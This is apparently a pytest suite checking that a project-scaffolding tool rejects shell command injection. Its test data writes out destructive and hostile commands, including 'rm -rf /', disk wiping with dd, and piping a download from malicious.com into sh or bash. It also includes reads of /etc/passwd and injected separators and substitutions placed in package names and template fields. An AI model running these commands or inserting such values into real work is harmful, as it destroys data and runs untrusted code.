# ABOUTME: Command injection security tests for preventing shell command injection attacks
# ABOUTME: Tests subprocess execution and command validation against malicious command injection

"""
Command injection security test suite.

This module provides comprehensive security testing for command execution
in the create-project application, including:
- Command executor security validation
- Git manager command security  
- Virtual environment manager security
- Shell metacharacter filtering
- Command substitution prevention
- Environment variable injection prevention
- Subprocess argument validation
"""

import subprocess
from pathlib import Path
from typing import List, Dict, Any
from unittest.mock import MagicMock, patch, call
import pytest

from create_project.core.command_executor import CommandExecutor
from create_project.core.git_manager import GitManager  
from create_project.core.venv_manager import VenvManager
from create_project.config.config_manager import ConfigManager


@pytest.mark.security
@pytest.mark.injection
class TestCommandExecutorSecurity:
    """Test security of command execution through CommandExecutor."""

    def test_command_executor_initialization(self):
        """Test that CommandExecutor initializes with secure defaults."""
        executor = CommandExecutor()
        assert executor is not None
        # CommandExecutor should have security measures in place

    @patch('subprocess.run')
    def test_command_execution_security(self, mock_run, security_temp_dir):
        """Test that commands are executed securely."""
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "Success"
        mock_run.return_value.stderr = ""
        
        executor = CommandExecutor()
        
        # Test executing a safe command
        result = executor.execute_command("echo test", cwd=security_temp_dir)
        
        # Should execute without issues
        assert mock_run.called
        call_args = mock_run.call_args
        
        # Verify secure execution parameters
        assert call_args[1].get('shell', True) is True  # May use shell but should be safe
        assert 'cwd' in call_args[1]  # Working directory should be set

    def test_malicious_command_handling(self, malicious_commands: List[str], security_temp_dir):
        """Test that malicious commands are handled safely."""
        executor = CommandExecutor()
        
        # Test a subset of malicious commands
        dangerous_commands = [
            "; rm -rf /",
            "&& del /q /s C:\\*", 
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
        ]
        
        for dangerous_cmd in dangerous_commands:
            # CommandExecutor should either reject or safely handle these
            try:
                result = executor.execute_command(dangerous_cmd, cwd=security_temp_dir)
                # If execution succeeds, verify it didn't actually execute dangerous parts
                assert result.success is False or result.returncode != 0
            except (ValueError, OSError, Exception):
                # Rejection is also acceptable
                pass


@pytest.mark.security
@pytest.mark.injection
class TestVirtualEnvironmentSecurity:
    """Test security of virtual environment command execution."""

    def test_prevent_venv_command_injection(self, malicious_commands: List[str]):
        """Test that virtual environment commands prevent injection."""
        venv_manager = VenvManager()
        
        injection_patterns = [cmd for cmd in malicious_commands 
                            if any(char in cmd for char in [";", "&", "|", "`"])]
        
        for injection in injection_patterns[:3]:
            with pytest.raises((ValueError, OSError, subprocess.SubprocessError)):
                # Malicious project paths should be rejected
                venv_manager.create_virtual_environment(Path(f"/tmp/venv{injection}"))

    def test_python_interpreter_validation(self):
        """Test that Python interpreter paths are validated."""
        venv_manager = VenvManager()
        
        malicious_interpreters = [
            "/tmp/fake_python; rm -rf /",
            "python && malicious_command",
            "python | evil_script",
            "`malicious_command`",
            "$(evil_command)",
        ]
        
        for malicious_interpreter in malicious_interpreters:
            with pytest.raises((ValueError, OSError)):
                venv_manager.validate_python_interpreter(malicious_interpreter)

    def test_pip_command_argument_security(self):
        """Test that pip commands have secure arguments."""
        venv_manager = VenvManager()
        
        malicious_packages = [
            "package; rm -rf /",
            "package && evil",
            "package | malicious",
            "package`whoami`",
            "package$(id)",
        ]
        
        for malicious_package in malicious_packages:
            with pytest.raises((ValueError, OSError)):
                venv_manager.validate_package_name(malicious_package)

    @patch('subprocess.run')
    def test_venv_subprocess_security(self, mock_run):
        """Test that virtual environment subprocess calls are secure."""
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "Success"
        mock_run.return_value.stderr = ""
        
        venv_manager = VenvManager()
        venv_manager.create_virtual_environment(Path("/tmp/test_venv"))
        
        # Verify secure subprocess execution
        mock_run.assert_called()
        call_args = mock_run.call_args
        
        # Shell should be disabled
        assert call_args[1].get('shell', False) is False
        
        # Command should be a list
        assert isinstance(call_args[0][0], list)


@pytest.mark.security
@pytest.mark.injection
class TestShellMetacharacterFiltering:
    """Test filtering of shell metacharacters and injection prevention."""

    def test_filter_command_separators(self, malicious_commands: List[str]):
        """Test that command separator characters are filtered."""
        command_executor = CommandExecutor()
        
        separators = [";", "&", "|", "&&", "||"]
        separator_commands = [cmd for cmd in malicious_commands 
                            if any(sep in cmd for sep in separators)]
        
        for malicious_cmd in separator_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(malicious_cmd)

    def test_filter_command_substitution(self, malicious_commands: List[str]):
        """Test that command substitution is filtered."""
        command_executor = CommandExecutor()
        
        substitution_patterns = ["`", "$(", "${"]
        substitution_commands = [cmd for cmd in malicious_commands 
                               if any(pattern in cmd for pattern in substitution_patterns)]
        
        for malicious_cmd in substitution_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(malicious_cmd)

    def test_filter_redirection_operators(self, malicious_commands: List[str]):
        """Test that redirection operators are filtered."""
        command_executor = CommandExecutor()
        
        redirection_commands = [cmd for cmd in malicious_commands 
                              if any(op in cmd for op in [">", "<", ">>", "2>&1"])]
        
        for malicious_cmd in redirection_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(malicious_cmd)

    def test_filter_background_execution(self, malicious_commands: List[str]):
        """Test that background execution is prevented."""
        command_executor = CommandExecutor()
        
        background_commands = [cmd for cmd in malicious_commands if "&" in cmd]
        
        for malicious_cmd in background_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(malicious_cmd)

    def test_whitelist_safe_commands(self):
        """Test that only whitelisted commands are allowed."""
        command_executor = CommandExecutor()
        
        # Safe commands that should be allowed
        safe_commands = [
            "git init",
            "python -m venv venv",
            "pip install package",
            "pytest",
            "mkdir directory",
        ]
        
        for safe_cmd in safe_commands:
            try:
                # These should be allowed
                command_executor.validate_command(safe_cmd)
            except Exception as e:
                pytest.fail(f"Safe command '{safe_cmd}' was rejected: {e}")

    def test_reject_dangerous_commands(self):
        """Test that dangerous commands are rejected."""
        command_executor = CommandExecutor()
        
        dangerous_commands = [
            "rm -rf /",
            "del /q /s C:\\*",
            "format C:",
            "dd if=/dev/zero of=/dev/sda",
            "curl malicious.com | sh",
            "wget -O - malicious.com | bash",
            "sudo su",
            "chmod 777 /etc/passwd",
        ]
        
        for dangerous_cmd in dangerous_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(dangerous_cmd)


@pytest.mark.security
@pytest.mark.injection
class TestEnvironmentVariableInjection:
    """Test prevention of environment variable injection attacks."""

    def test_prevent_env_var_injection_in_commands(self):
        """Test that environment variables cannot be injected into commands."""
        command_executor = CommandExecutor()
        
        env_injections = [
            "$HOME/malicious_script.sh",
            "${PATH}/evil",
            "$IFS$()cat$IFS/etc/passwd",
            "$(eval $MALICIOUS_VAR)",
            "${HOME:-`whoami`}",
        ]
        
        for injection in env_injections:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_command(injection)

    def test_sanitize_environment_variables(self):
        """Test that environment variables are sanitized."""
        command_executor = CommandExecutor()
        
        malicious_env_vars = {
            "MALICIOUS": "; rm -rf /",
            "EVIL": "$(whoami)",
            "INJECTION": "`cat /etc/passwd`",
            "BAD": "&& malicious_command",
        }
        
        for var_name, var_value in malicious_env_vars.items():
            sanitized_env = command_executor.sanitize_environment_variables({var_name: var_value})
            
            # Malicious content should be removed or escaped
            sanitized_value = sanitized_env.get(var_name, "")
            assert ";" not in sanitized_value
            assert "$(" not in sanitized_value
            assert "`" not in sanitized_value
            assert "&&" not in sanitized_value

    @patch('subprocess.run')
    def test_subprocess_environment_isolation(self, mock_run):
        """Test that subprocess calls have isolated environments."""
        mock_run.return_value.returncode = 0
        
        command_executor = CommandExecutor()
        command_executor.execute_command(["echo", "test"], cwd="/tmp")
        
        mock_run.assert_called()
        call_args = mock_run.call_args
        
        # Environment should be controlled
        env = call_args[1].get('env', {})
        
        # Dangerous environment variables should not be passed
        dangerous_vars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONPATH']
        for dangerous_var in dangerous_vars:
            assert dangerous_var not in env or env[dangerous_var] == ""


@pytest.mark.security
@pytest.mark.injection
class TestSubprocessArgumentValidation:
    """Test validation of subprocess arguments and execution."""

    def test_argument_list_validation(self):
        """Test that subprocess arguments are properly validated."""
        command_executor = CommandExecutor()
        
        # Test that arguments are validated as a list
        malicious_args = [
            ["git", "init", "; rm -rf /"],
            ["python", "-c", "import os; os.system('rm -rf /')"],
            ["pip", "install", "package && evil"],
            ["mkdir", "dir`whoami`"],
        ]
        
        for args in malicious_args:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_argument_list(args)

    def test_prevent_argument_injection(self):
        """Test that argument injection is prevented."""
        command_executor = CommandExecutor()
        
        # Arguments that try to inject additional commands
        injection_attempts = [
            "--config=core.editor='rm -rf /'",
            "--exec='malicious command'",
            "-c 'import os; os.system(\"evil\")'",
            "--help; rm -rf /",
        ]
        
        for injection in injection_attempts:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_argument(injection)

    @patch('subprocess.run')
    def test_subprocess_call_structure(self, mock_run):
        """Test that subprocess calls have proper structure."""
        mock_run.return_value.returncode = 0
        
        command_executor = CommandExecutor()
        command_executor.execute_command(["git", "init"], cwd="/tmp")
        
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        
        # Verify secure call structure
        assert isinstance(args[0], list)  # Command as list, not string
        assert kwargs.get('shell', False) is False  # Shell disabled
        assert 'cwd' in kwargs  # Working directory specified
        assert kwargs.get('capture_output', False) is True  # Output captured


@pytest.mark.security
@pytest.mark.injection
class TestPostGenerationCommandSecurity:
    """Test security of post-generation command execution."""

    def test_validate_post_generation_commands(self):
        """Test that post-generation commands are validated."""
        command_executor = CommandExecutor()
        
        # Common post-generation commands that should be safe
        safe_post_commands = [
            "pip install -r requirements.txt",
            "npm install",
            "pytest",
            "black .",
            "ruff check .",
        ]
        
        for safe_cmd in safe_post_commands:
            try:
                command_executor.validate_post_generation_command(safe_cmd)
            except Exception as e:
                pytest.fail(f"Safe post-generation command rejected: {e}")

    def test_reject_dangerous_post_commands(self):
        """Test that dangerous post-generation commands are rejected."""
        command_executor = CommandExecutor()
        
        dangerous_post_commands = [
            "curl malicious.com | sh",
            "rm -rf /",
            "chmod 777 /etc/passwd", 
            "sudo rm important_file",
            "git clone malicious.com/evil.git && cd evil && ./install.sh",
        ]
        
        for dangerous_cmd in dangerous_post_commands:
            with pytest.raises((ValueError, OSError)):
                command_executor.validate_post_generation_command(dangerous_cmd)

    def test_template_command_injection_prevention(self):
        """Test that template-specified commands cannot inject malicious code."""
        command_executor = CommandExecutor()
        
        # Template commands with injection attempts
        malicious_template_commands = [
            "pip install {{package_name}}; rm -rf /",
            "echo '{{description}}' && malicious_command",
            "mkdir {{project_name}}`whoami`",
            "touch {{project_name}}/file.txt; cat /etc/passwd",
        ]
        
        template_vars = {
            "package_name": "requests",
            "description": "A test project",
            "project_name": "test_project",
        }
        
        for template_cmd in malicious_template_commands:
            with pytest.raises((ValueError, OSError)):
                # Render template command and validate
                rendered_cmd = template_cmd.format(**template_vars)
                command_executor.validate_command(rendered_cmd)


@pytest.mark.security
@pytest.mark.injection
class TestCommandInjectionIntegration:
    """Test command injection prevention in integrated scenarios."""

    @patch('subprocess.run')
    def test_end_to_end_command_injection_prevention(self, mock_run, security_temp_dir):
        """Test that command injection is prevented in project generation."""
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "Success"
        mock_run.return_value.stderr = ""
        
        from create_project.core.api import create_project
        
        # Project with malicious post-generation commands
        malicious_variables = {
            "author": "Test User",
            "version": "1.0.0",
            "description": "Test; rm -rf /",  # Injection in description
            "post_install_command": "pip install requests && evil_command",
        }
        
        # Should either reject malicious variables or execute safely
        try:
            result = create_project(
                template_name="python_library",
                project_name="test_project",
                target_directory=security_temp_dir,
                variables=malicious_variables,
            )
            
            # If it succeeds, verify no malicious commands were executed
            if mock_run.called:
                for call_args in mock_run.call_args_list:
                    command_str = ' '.join(str(arg) for arg in call_args[0][0])
                    assert "rm -rf /" not in command_str
                    assert "evil_command" not in command_str
                    
        except (ValueError, OSError, Exception):
            # Rejection is also acceptable for security
            pass

    def test_template_command_security_validation(self, security_temp_dir):
        """Test that template commands are validated for security."""
        from create_project.templates.engine import TemplateEngine
        
        template_engine = TemplateEngine()
        
        # Template with malicious commands
        malicious_template_content = """
        post_generation_commands:
          - pip install -r requirements.txt
          - echo "Setup complete"; rm -rf /tmp/*
          - git init && git add . && git commit -m "Initial commit" | malicious_script
        """
        
        # Should detect and reject malicious commands in template
        with pytest.raises((ValueError, OSError, Exception)):
            template_engine.validate_template_commands(malicious_template_content)

    def test_user_input_command_sanitization(self):
        """Test that user input is sanitized before use in commands."""
        command_executor = CommandExecutor()
        
        # User inputs that could be used in commands
        malicious_user_inputs = {
            "project_name": "test; rm -rf /",
            "author": "User && evil",
            "email": "user@test.com | malicious",
            "version": "1.0.0`whoami`",
        }
        
        for input_name, malicious_input in malicious_user_inputs.items():
            # Should sanitize the input before using in commands
            sanitized = command_executor.sanitize_user_input(malicious_input)
            
            # Dangerous characters should be removed or escaped
            assert ";" not in sanitized
            assert "&&" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized